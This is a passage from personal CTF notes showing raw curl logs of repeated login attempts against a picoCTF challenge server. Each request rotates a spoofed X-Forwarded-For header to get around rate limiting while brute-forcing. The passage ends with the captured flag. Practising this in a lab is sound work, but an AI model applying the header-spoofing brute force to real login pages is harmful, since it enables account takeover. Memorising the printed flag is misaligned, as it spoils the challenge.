+< Date: Mon, 20 Oct 2025 23:52:27 GMT
+< Connection: keep-alive
+< Keep-Alive: timeout=5
+< 
+{ [17 bytes data]
+100    73  100    17  100    56     21     70 --:--:-- --:--:-- --:--:--    92
+,* Connection #0 to host amiable-citadel.picoctf.net left intact
+{"success":false}Note: Unnecessary use of -X or --request, POST is already inferred.
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0*   Trying 3.23.68.152:57780...
+,* Connected to amiable-citadel.picoctf.net (3.23.68.152) port 57780 (#0)
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0> POST /login HTTP/1.1
+> Host: amiable-citadel.picoctf.net:57780
+> X-Forwarded-For: 1.2.3.16
+> User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:143.0) Gecko/20100101 Firefox/143.0
+> Accept: */*
+> Accept-Language: en-US,en;q=0.5
+> Accept-Encoding: gzip, deflate
+> Referer: http://amiable-citadel.picoctf.net:57381/
+> Content-Type: application/json
+> Origin: http://amiable-citadel.picoctf.net:57381
+> Connection: keep-alive
+> Priority: u=0
+> Content-Length: 56
+> 
+} [56 bytes data]
+< HTTP/1.1 200 OK
+< X-Powered-By: Express
+< Content-Type: application/json; charset=utf-8
+< Content-Length: 17
+< ETag: W/"11-UIVUdQWNarX1D9mk06okyEMbpS8"
+< Date: Mon, 20 Oct 2025 23:52:28 GMT
+< Connection: keep-alive
+< Keep-Alive: timeout=5
+< 
+{ [17 bytes data]
+100    73  100    17  100    56     21     69 --:--:-- --:--:-- --:--:--    90
+,* Connection #0 to host amiable-citadel.picoctf.net left intact
+{"success":false}Note: Unnecessary use of -X or --request, POST is already inferred.
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0*   Trying 3.23.68.152:57780...
+,* Connected to amiable-citadel.picoctf.net (3.23.68.152) port 57780 (#0)
+> POST /login HTTP/1.1
+> Host: amiable-citadel.picoctf.net:57780
+> X-Forwarded-For: 1.2.3.17
+> User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:143.0) Gecko/20100101 Firefox/143.0
+> Accept: */*
+> Accept-Language: en-US,en;q=0.5
+> Accept-Encoding: gzip, deflate
+> Referer: http://amiable-citadel.picoctf.net:57381/
+> Content-Type: application/json
+> Origin: http://amiable-citadel.picoctf.net:57381
+> Connection: keep-alive
+> Priority: u=0
+> Content-Length: 56
+> 
+} [56 bytes data]
+< HTTP/1.1 200 OK
+< X-Powered-By: Express
+< Content-Type: application/json; charset=utf-8
+< Content-Length: 17
+< ETag: W/"11-UIVUdQWNarX1D9mk06okyEMbpS8"
+< Date: Mon, 20 Oct 2025 23:52:29 GMT
+< Connection: keep-alive
+< Keep-Alive: timeout=5
+< 
+{ [17 bytes data]
+100    73  100    17  100    56     28     92 --:--:-- --:--:-- --:--:--   120100    73  100    17  100    56     28     92 --:--:-- --:--:-- --:--:--   120
+,* Connection #0 to host amiable-citadel.picoctf.net left intact
+{"success":false}Note: Unnecessary use of -X or --request, POST is already inferred.
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0*   Trying 3.23.68.152:57780...
+,* Connected to amiable-citadel.picoctf.net (3.23.68.152) port 57780 (#0)
+> POST /login HTTP/1.1
+> Host: amiable-citadel.picoctf.net:57780
+> X-Forwarded-For: 1.2.3.18
+> User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:143.0) Gecko/20100101 Firefox/143.0
+> Accept: */*
+> Accept-Language: en-US,en;q=0.5
+> Accept-Encoding: gzip, deflate
+> Referer: http://amiable-citadel.picoctf.net:57381/
+> Content-Type: application/json
+> Origin: http://amiable-citadel.picoctf.net:57381
+> Connection: keep-alive
+> Priority: u=0
+> Content-Length: 56
+> 
+} [56 bytes data]
+< HTTP/1.1 200 OK
+< X-Powered-By: Express
+< Content-Type: application/json; charset=utf-8
+< Content-Length: 17
+< ETag: W/"11-UIVUdQWNarX1D9mk06okyEMbpS8"
+< Date: Mon, 20 Oct 2025 23:52:30 GMT
+< Connection: keep-alive
+< Keep-Alive: timeout=5
+< 
+{ [17 bytes data]
+100    73  100    17  100    56     28     93 --:--:-- --:--:-- --:--:--   121
+,* Connection #0 to host amiable-citadel.picoctf.net left intact
+{"success":false}Note: Unnecessary use of -X or --request, POST is already inferred.
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0*   Trying 3.23.68.152:57780...
+,* Connected to amiable-citadel.picoctf.net (3.23.68.152) port 57780 (#0)
+> POST /login HTTP/1.1
+> Host: amiable-citadel.picoctf.net:57780
+> X-Forwarded-For: 1.2.3.19
+> User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:143.0) Gecko/20100101 Firefox/143.0
+> Accept: */*
+> Accept-Language: en-US,en;q=0.5
+> Accept-Encoding: gzip, deflate
+> Referer: http://amiable-citadel.picoctf.net:57381/
+> Content-Type: application/json
+> Origin: http://amiable-citadel.picoctf.net:57381
+> Connection: keep-alive
+> Priority: u=0
+> Content-Length: 56
+> 
+} [56 bytes data]
+100    56    0     0  100    56      0    238 --:--:-- --:--:-- --:--:--   238< HTTP/1.1 200 OK
+< X-Powered-By: Express
+< Content-Type: application/json; charset=utf-8
+< Content-Length: 17
+< ETag: W/"11-UIVUdQWNarX1D9mk06okyEMbpS8"
+< Date: Mon, 20 Oct 2025 23:52:30 GMT
+< Connection: keep-alive
+< Keep-Alive: timeout=5
+< 
+{ [17 bytes data]
+100    73  100    17  100    56     28     92 --:--:-- --:--:-- --:--:--   120
+,* Connection #0 to host amiable-citadel.picoctf.net left intact
+{"success":false}
+#+end_example
+
+picoCTF{xff_byp4ss_brut3_1cc3b76e}
+
 * [2025-10-19 Sun]
 
 Worked on more challenges today.
